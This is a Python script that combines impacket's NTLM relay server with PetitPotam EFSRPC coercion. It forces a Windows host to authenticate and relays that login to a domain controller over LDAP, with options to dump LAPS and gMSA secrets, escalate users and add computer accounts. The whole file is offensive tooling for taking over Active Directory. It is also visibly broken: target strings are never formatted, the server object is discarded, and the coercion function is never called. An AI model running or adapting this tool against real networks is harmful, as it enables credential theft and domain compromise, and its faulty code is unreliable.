import logging
import sys
import argparse
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS

import netifaces

from PetitPotam import CoerceAuth

def init_server(server, options):
    options.dump_laps = True
    config = NTLMRelayxConfig()
    config.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid)
    config.setSMB2Support(options.smb2support)

    if options.dc_ip is not None:
        target = "ldap://{dc_ip}"
        if options.ldaps:
            target = "ldaps://{dc_ip}"
        logging.info("Running in relay mode to single host")
        mode = 'RELAY'
        targetSystem = TargetsProcessor(singleTarget=target, protocolClients=PROTOCOL_CLIENTS, randomize=options.random)
        # Disabling multirelay feature (Single host + general candidate)
        if targetSystem.generalCandidates:
            options.no_multirelay = True
    
    server(config)

def start_server(server):
    server.start()

def stop_server(server):
    server.shutdown()

def start_petitpotam(petitpotam, options):
    listener = netifaces.ifaddresses(options.interface)[netifaces.AF_INET][0]['addr']

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''
    
    if options.pipe == "all":
        all_pipes = ['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass']
    else:
        all_pipes = [options.pipe]
    
    for all_pipe in all_pipes:
        print("Trying pipe", all_pipe)
        dce = petitpotam.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.victim_ip, pipe=all_pipe, doKerberos=options.k, dcHost=options.dc_ip)
        if dce is not None:
            petitpotam.EfsRpcOpenFileRaw(dce, listener)
            dce.disconnect()

def main():
    petitpotam = CoerceAuth()
    server = SMBRelayServer

    parser = argparse.ArgumentParser(add_help = False, description = "using PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw(),"
                                    "For every connection received, this module will try to relay that connection to a domain controller")
    parser._optionals.title = "Main options"
    parser.add_argument('-dc-ip', action='store', help="Domain Controller ip")
    parser.add_argument('-ldaps', action='store', help="if LDAPS")
    parser.add_argument('-smb2support', action="store_true", default=False, help='SMB2 Support')
    parser.add_argument('-u', '--username', action="store", default='', help='valid username [petitpotam]')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass) [petitpotam]')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name [petitpotam]')
    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty) [petitpotam]')

    parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k) [petitpotam]')
    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                        'cannot be found, it will use the ones specified in the command '
                        'line [petitpotam]')

    parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass', 'all'], default='lsarpc', help='Named pipe to use (default: lsarpc) or all [petitpotam]')
    parser.add_argument('-victim-ip', help='ip address [petitpotam]')
    parser.add_argument('-interface', help='the interface you are expecting the request to come from')

    try:
       options = parser.parse_args()
    except Exception as e:
       logging.error(str(e))
       sys.exit(1)

    init_server(server, options)
    start_server(server)

if __name__ == '__main__':
    main()
